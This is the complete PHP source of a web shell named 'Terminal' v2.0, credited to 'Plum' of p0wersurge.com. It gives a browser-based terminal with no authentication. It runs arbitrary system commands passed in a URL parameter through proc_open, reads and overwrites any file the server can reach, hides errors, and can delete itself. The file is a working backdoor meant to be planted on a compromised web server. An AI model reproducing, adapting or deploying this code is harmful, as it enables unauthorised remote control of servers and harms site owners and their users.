<?php 
/******************************************* 
Source written by Plum 
Version: 2.0 
Visit p0wersurge.com  
#TeamPS  
                      __---__  
                   _-       _--______  
              __--( /     \ )XXXXXXXXXXXXX_  
            --XXX(   O   O  )XXXXXXXXXXXXXXX-  
           /XXX(       U     )        XXXXXXX\  
         /XXXXX(              )--_  XXXXXXXXXXX\  
        /XXXXX/ (      O     )   XXXXXX   \XXXXX\  
        XXXXX/   /            XXXXXX   \__ \XXXXX----  
        XXXXXX__/          XXXXXX         \__----  -  
---___  XXX__/          XXXXXX      \__         ---  
  --  --__/   ___/\  XXXXXX            /  ___---=  
    -_    ___/    XXXXXX              '--- XXXXXX  
      --\/XXX\ XXXXXX                      /XXXXX  
        \XXXXXXXXX                        /XXXXX/  
         \XXXXXX                        _/XXXXX/  
           \XXXXX--__/              __-- XXXX/  
            --XXXXXXX---------------  XXXXX--  
               \XXXXXXXXXXXXXXXXXXXXXXXX-  
                 --XXXXXXXXXXXXXXXXXX-  
           * * * * * who ya gonna call? * * * * *  
*******************************************/ 
error_reporting(0); 
session_start(); 
//Clean directory function 
function CleanDir($directory) { 
    $directory = str_replace("\\", "/", $directory); 
    $directory = str_replace("//", "/", $directory); 
    return $directory; 
} 
$servername = $_SERVER['SERVER_NAME']; 
$whoami = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid()) : exec("whoami"); 
$whoami = function_exists("posix_getpwuid") ? $whoami['name'] : exec("whoami"); 
$scriptname = basename($_SERVER['SCRIPT_NAME']); 
$software = $_SERVER['SERVER_SOFTWARE']; 
$current = CleanDir(getcwd()); 
if (strpos($software, "Win") != FALSE) { 
    $whoami = strstr($whoami, "\\"); 
    $whoami = substr($whoami, 1); 
} 
if (empty($_SESSION['directory'])) { 
    $_SESSION['path'] = $current; 
    $line = "$whoami@$servername:$current$"; 
} else { 
    $dir = $_SESSION['directory']; 
    $line = "$whoami@$servername:$dir$"; 
    chdir($dir); 
} 
$file_path = $_SESSION['path']; 
$history_file = "$file_path/command_history.txt"; 
if (isset($_GET['cFile'])) { 
    $cfile = $_GET['cFile']; 
    $his = "Cancelled file edit\n$line"; 
    file_put_contents($history_file, $his, FILE_APPEND); 
    echo file_get_contents($history_file); 
    exit; 
} 
if (isset($_POST['filedir'])) { 
    $filedir = $_POST['filedir']; 
    $content = $_POST['newcontent']; 
    if (file_put_contents($filedir, $content)) { 
        $his = "Saved file $filedir\n$line"; 
        file_put_contents($history_file, $his, FILE_APPEND); 
        echo file_get_contents($history_file); 
    } else { 
        $his = "Failed to save file $filedir\n$line"; 
        file_put_contents($history_file, $his, FILE_APPEND); 
        echo file_get_contents($history_file); 
    } 
    exit; 
} 
if (isset($_GET['editFile'])) { 
    $file = $_GET['editFile']; 
    if (file_exists($file)) { 
        echo file_get_contents($file); 
    } else { 
        echo ""; 
    } 
    exit; 
} 
if (isset($_GET['sendCommand'])) { 
    $command = $_GET['sendCommand']; 
    if ($command == "clear") { 
        $_SESSION['history'] = $line;
        echo $_SESSION['history'];
    } elseif ($command == "cd") { 
        $_SESSION['directory'] = "$file_path"; 
        $line2 = "$whoami@$servername:$file_path$"; 
        $his = " $command\n$line2"; 
        file_put_contents($history_file, $his, FILE_APPEND); 
        echo file_get_contents($history_file); 
    } elseif (substr($command, 0, 3) == "cd ") { 
        $cddir = rtrim(CleanDir(str_replace("cd ", "", $command)), '/'); 
        if (is_dir($cddir)) { 
            $_SESSION['directory'] = "$cddir"; 
            $line2 = "$whoami@$servername:$cddir$"; 
            $his = " $command\n$line2"; 
        } else { 
            $his = " $command\nCannont change directory to $cddir\n$line"; 
        } 
        file_put_contents($history_file, $his, FILE_APPEND); 
        echo file_get_contents($history_file); 
    } elseif ($command == "help") { 
        $help = "################################## 
###############v2.0############### 
Some commands: 
help - brings up help menu 
cd - cd's to directory file is in 
kill - kills the tool 
Changing directories: 
cd [path] 
Example: cd /home/lol/public_html 
Edit/Create file: 
gedit [path] 
Example: gedit /home/lol/public_html/index.php 
If the file does not exist it will attempt to create it. 
Written by: Plum 
Visit: http://p0wersurge.com 
################################## 
##################################"; 
        $his = " $command\n$help\n$line"; 
        file_put_contents($history_file, $his, FILE_APPEND); 
        echo file_get_contents($history_file); 
    } elseif ($command == "kill") { 
        $his = " $command\nTool killed"; 
        file_put_contents($history_file, $his, FILE_APPEND); 
        echo file_get_contents($history_file); 
        unlink($history_file); 
        unlink("$file_path/$scriptname"); 
    } elseif (substr($command, 0, 6) == "gedit ") { 
        $efile = str_replace("gedit ", "", $command); 
        echo "$command"; 
        $his = " $command\n"; 
        file_put_contents($history_file, $his, FILE_APPEND); 
    } else { 
        $execute = proc_open($command, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io); 
        while (!feof($io[1])) { 
            $res.= fgets($io[1]); 
        } 
        while (!feof($io[2])) { 
            $res.= fgets($io[2]); 
        } 
        fclose($io[1]); 
        fclose($io[2]); 
        proc_close($execute); 
        $his = " $command\n$res$line"; 
        //file_put_contents($history_file, $his, FILE_APPEND);
		$_SESSION['history'] .= $his;
        echo $_SESSION['history'];
    } 
    exit; 
} 
?> 

<title>Terminal</title>  
<style type="text/css">  
body {  
background:url('http://i.imgur.com/DzeVO.jpg') no-repeat center center fixed;  
-webkit-background-size: cover;  
-moz-background-size: cover;  
-o-background-size: cover;  
background-size: cover;  
color:#FFFFFF;  
overflow:hidden;  
}  
textarea.box  
{  
width:721px;  
height:420px;  
padding:10px;  
border-width: thin;  
border:1px solid #e0e0e0;  
background-color:rgba(0,0,0,0.90);  
font-family: consolas;  
font-size: 15; 
outline:none; 
color:#FFFFFF; 
} 
input.command_line { 
width:640px;  
height:40px;  
padding:10px; 
border: none; 
outline: none; 
background-color:rgba(0,0,0,0.90);  
font-family: consolas;  
font-size: 15; 
color: #FFFFFF; 
} 
#drag  
{  
width:699px;  
height:450px;  
}  
a:link {color: #C0C0C0; text-decoration: none; }  
a:active {color: #C0C0C0; text-decoration: none; }  
a:visited {color: #C0C0C0; text-decoration: none; }  
a:hover {color: #FFFFFF; text-decoration: none; }  
#popup_container { 
    font-family: consolas; 
    font-size: 12px; 
    min-width: 900px; /* Dialog will be no smaller than this */ 
    max-width: 600px; /* Dialog will wrap after this width */ 
    background: #FFF; 
    border: solid 5px #999; 
    color: #000; 
    -moz-border-radius: 5px; 
    -webkit-border-radius: 5px; 
    border-radius: 5px; 
} 

#popup_title { 
    font-size: 14px; 
    font-weight: bold; 
    text-align: center; 
    line-height: 1.75em; 
    color: #666; 
    background: #CCC; 
    border: solid 1px #FFF; 
    border-bottom: solid 1px #999; 
    cursor: default; 
    padding: 0em; 
    margin: 0em; 
} 

#popup_content { 
    padding: 1em 1.75em; 
} 
#popup_panel { 
    text-align: center; 
    margin: 1em 0em 0em 1em; 
} 
textarea.editFileText { 
resize:none; 
outline:none; 
} 
</style>  
<script  type='text/javascript' src='http://ajax.microsoft.com/ajax/jquery/jquery-1.4.2.min.js'></script>
<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.2/jquery-ui.min.js'></script>
<script src="http://p0wersurge.com/js/jquery.alerts.js" type="text/javascript"></script> 
<script> 
function trim1 (str) { 
    return str.replace(/^\s\s*/, '').replace(/\s\s*$/, ''); 
} 
function clearCommand() { 
document.getElementById("command").value = ''; 
} 
function scrollToBottom() { 
document.getElementById("box").scrollTop = box.scrollHeight; 
} 
function sendCommand() { 
var command = escape(document.getElementById("command").value); 
var sendC = new XMLHttpRequest(); 
    sendC.onreadystatechange = function() 
    { 
        if(sendC.readyState == 4 && sendC.status == 200) 
        { 
            var res = sendC.responseText; 
            if(res.substring(0,6) == "gedit ") { 
                var file = res.replace("gedit ", ""); 
                editFile(file); 
                } else { 
                document.getElementById("box").value= trim1(sendC.responseText); 
                } 
                scrollToBottom(); 
        } 

    } 
    sendC.open("GET", "<?php echo $scriptname; ?>"+"?sendCommand="+command, true); 
    sendC.send(); 
    clearCommand(); 
    return false; 
} 
function editFile(filedir) { 
var editFile = new XMLHttpRequest(); 
    editFile.onreadystatechange = function() 
    { 
        if(editFile.readyState == 4 && editFile.status == 200) 
        { 
                jPrompt('', '', filedir+' - gedit', function(r) { 
                         if( r ) {  
                         saveFile(r, filedir); 
                         } else { 
                         cancelled(filedir); 
                         } 
                }); 
                document.getElementById("editFileArea").value=editFile.responseText; 
        } 

    } 
    editFile.open("GET", "<?php echo $scriptname; ?>"+"?editFile="+filedir, true); 
    editFile.send(); 
    return false; 
} 
function cancelled(filedir) { 
var cFile = new XMLHttpRequest(); 
    cFile.onreadystatechange = function() 
    { 
        if(cFile.readyState == 4 && cFile.status == 200) 
        { 
                document.getElementById("box").value= trim1(cFile.responseText); 
        } 

    } 
    cFile.open("GET", "<?php echo $scriptname; ?>"+"?cFile="+filedir, true); 
    cFile.send(); 
    return false; 
} 
function saveFile(content, filedir) { 
var saveFile = new XMLHttpRequest(); 
    var params = "newcontent="+encodeURIComponent(content)+"&filedir="+filedir; 
    saveFile.open("POST", "<?php echo $scriptname; ?>", true); 
    saveFile.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
    saveFile.setRequestHeader("Content-length", params.length); 
    saveFile.onreadystatechange = function() 
    { 
        if(saveFile.readyState == 4 && saveFile.status == 200) 
        { 
                document.getElementById("box").value= trim1(saveFile.responseText); 
        } 

    } 
    saveFile.send(params); 
    return false; 
} 
</script> 
<center> 
<form onsubmit="return sendCommand();"> 
<input type='text' id='command' class='command_line' autocomplete='off'> 
<div id="drag">  
<img src="http://i.imgur.com/6JjZe.png"><br>  
<textarea class="box" id="box"> 
<?php 
if (!isset($_SESSION['history'])) { 
    $_SESSION['history'] = $line;
} 
echo $_SESSION['history'];  
?> 
</textarea>  

</div>
 </form> 
</center>  
<script type='text/javascript'>  
$('#box').keydown(function(event) {
    if (event.keyCode == 13) {
        alert($('#box').val().length);
        return false;
     }
});
   $(document).ready(function(){  
        $('#drag').draggable();  
    });  
  </script>
